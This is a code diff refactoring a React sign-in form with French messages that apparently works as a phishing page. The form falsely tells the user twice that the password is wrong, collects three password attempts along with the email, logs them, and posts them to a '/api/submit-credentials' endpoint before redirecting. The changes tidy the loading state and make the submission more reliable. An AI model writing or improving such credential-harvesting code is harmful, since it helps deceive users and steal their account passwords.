@@ -44,47 +44,52 @@ export default function Component() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-  
+    if (loading) return;
+    setLoading(true);
+
     if (!showPassword) {
       const emailError = validateEmail(email);
       if (emailError) {
         setError(emailError);
+        setLoading(false);
         return;
       }
       setShowPassword(true);
+      setLoading(false);
       return;
     }
-  
+
     const passwordError = validatePassword(password);
     if (passwordError) {
       setError(passwordError);
+      setLoading(false);
       return;
     }
-  
+
     const updatedPasswords = [...passwords, password].slice(-3);
     setPasswords(updatedPasswords);
-  
-    setAttempts((prevAttempts) => {
-      const newAttempts = prevAttempts + 1;
-  
-      console.log("Attempt", newAttempts, ":", {
-        email,
-        passwords: updatedPasswords,
-      });
-  
+
+    const newAttempts = attempts + 1;
+    setAttempts(newAttempts);
+
+    console.log("Attempt", newAttempts, ":", {
+      email,
+      passwords: updatedPasswords,
+    });
+
+    if (newAttempts === 3) {
+      await submitCredentials(email, updatedPasswords);
+    } else {
       if (newAttempts === 1) {
         setError("Mot de passe incorrect. Veuillez réessayer.");
       } else if (newAttempts === 2) {
         setError("Deuxième tentative échouée. Dernière chance.");
-      } else if (newAttempts === 3) {
-        setLoading(true);
-        submitCredentials(email, updatedPasswords);
       }
-  
-      return newAttempts;
-    });
+    }
+
+    setLoading(false);
   };
-  
+
   const submitCredentials = async (email: string, passwords: string[]) => {
     try {
       const response = await fetch("/api/submit-credentials", {
@@ -94,15 +99,17 @@ export default function Component() {
         },
         body: JSON.stringify({ email, passwords }),
       });
-  
+
       if (!response.ok) {
         throw new Error("Failed to submit credentials");
       }
-  
+
       window.location.href = "#";
     } catch (error) {
       console.error("Error:", error);
-      setError("Une erreur s'est produite lors de la soumission. Veuillez réessayer.");
+      setError(
+        "Une erreur s'est produite lors de la soumission. Veuillez réessayer."
+      );
     } finally {
       setLoading(false);
     }
